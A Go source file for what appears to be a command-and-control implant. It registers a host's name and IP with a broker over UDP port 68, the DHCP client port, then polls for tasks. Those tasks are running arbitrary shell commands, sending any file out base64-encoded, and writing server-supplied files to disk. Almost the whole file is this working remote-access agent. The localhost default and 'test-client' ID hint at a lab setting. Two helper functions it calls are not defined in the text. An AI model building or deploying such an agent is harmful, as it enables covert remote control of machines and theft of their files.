package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

const (
	brokerIP   = "127.0.0.1" // change to server IP if remote
	serverPort = 68
	pollEvery  = 10 * time.Second
	readTO     = 3 * time.Second // how long to wait for server reply
	clientID   = "test-client"
)

type Payload struct {
	ClientID  string  `json:"clientID"`            // unique per client
	Command   string  `json:"command"`             // "run", "upload", "download", "report"
	CommandID *string `json:"commandID,omitempty"` // unique ID per command
	Args      *string `json:"args,omitempty"`      // arguments: shell string, filepath, etc.
	Output    *string `json:"output,omitempty"`    // stdout/stderr, or base64 file data
	Status    *string `json:"status,omitempty"`    // "ok", "error" (optional, for feedback)
	Path      *string `json:"path"`                // path for
	//registration info
	IP       *string `json:"ip,omitempty"`
	Hostname *string `json:"hostname,omitempty"`
	BrokerIP *string `json:"broker,omitempty"`
}

func (p Payload) String() string {
	s, _ := json.Marshal(p)
	return string(s)
}

func runCommand(command string) string {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return "no command provided"
	}

	cmd := exec.Command(parts[0], parts[1:]...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("error: %v\n%s", err, string(out))
	}
	return string(out)
}

func uploadFile(path string) (string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(data), nil
}

func downloadFile(path, b64 string) error {
	log.Printf("decoding data: %s", b64)
	data, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return err
	}
	log.Print("writing file")
	return os.WriteFile(path, data, 0644)
}

func main() {

	serverAddr := &net.UDPAddr{
		IP:   net.ParseIP(brokerIP),
		Port: serverPort,
	}

	// Use ticker to perform the periodic transaction.
	ticker := time.NewTicker(pollEvery)
	defer ticker.Stop()

	// Run one immediately, then on each tick
	log.Printf("client: starting, will poll server %s every %v", serverAddr.String(), pollEvery)
	log.Printf("registering...")

	hostname, err := os.Hostname()
	if err != nil {
		hostname = "error fetching hostname"
	}
	ip, err := getMyIP()
	if err != nil {
		log.Printf("error fetching local IP: %v", err)
		ip = "error fetching IP"
	}

	broker := brokerIP
	registrationPayload := Payload{
		ClientID:  clientID,
		Command:   "register",
		Args:      nil,
		CommandID: nil,
		Output:    nil,
		Status:    nil,
		IP:        &ip,
		Hostname:  &hostname,
		BrokerIP:  &broker,
	}
	response := doTransaction(registrationPayload)
	log.Printf("REGISTRATION RESPONSE: %s", response)

	// allow clean shutdown
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)

	for {
		select {
		case <-ticker.C:
			log.Print("Checking in...")
			payload := Payload{
				ClientID:  clientID,
				Command:   "checkin",
				Args:      nil,
				CommandID: nil,
				Output:    nil,
				Status:    nil,
				IP:        &ip,
				Hostname:  &hostname,
				BrokerIP:  &broker,
			}
			reply := ""
			response = doTransaction(payload)
			json.Unmarshal([]byte(response), &payload) // update payload with any new command info
			if payload.Command == "run" && payload.Args != nil {
				fmt.Printf("Running command: %s %s", payload.Command, *payload.Args)
				output := runCommand(*payload.Args)
				payload.Output = &output
				payload.Command = "report"
				// Send result back
				payload.Output = &output
				reply = doTransaction(payload)
			}
			// log.Printf("Command is: %s", payload.Command)

			if payload.Command == "upload" && payload.Args != nil {
				fmt.Printf("Uploading file: %s %s", payload.Command, *payload.Args)
				filePath := *payload.Args
				encoded, err := uploadFile(filePath)
				if err != nil {
					output := fmt.Sprintf("upload failed: %v", err)
					payload.Output = &output
				} else {
					payload.Output = &encoded
				}
				payload.Command = "upload"
				reply = doTransaction(payload)
			}

			if payload.Command == "download" && payload.Args != nil {
				log.Print("Processing Download")
				filePath := *payload.Path
				b64data := *payload.Args

				err := downloadFile(filePath, b64data)
				if err != nil {
					result := fmt.Sprintf("download failed: %v", err)
					payload.Output = &result
				} else {
					result := fmt.Sprintf("downloaded to %s", filePath)
					payload.Output = &result
				}
				payload.Command = "report"
				reply = doTransaction(payload)
			}
			log.Print(reply)
		case <-stop:
			log.Println("client: received shutdown signal, exiting")
			return
		}
	}
}
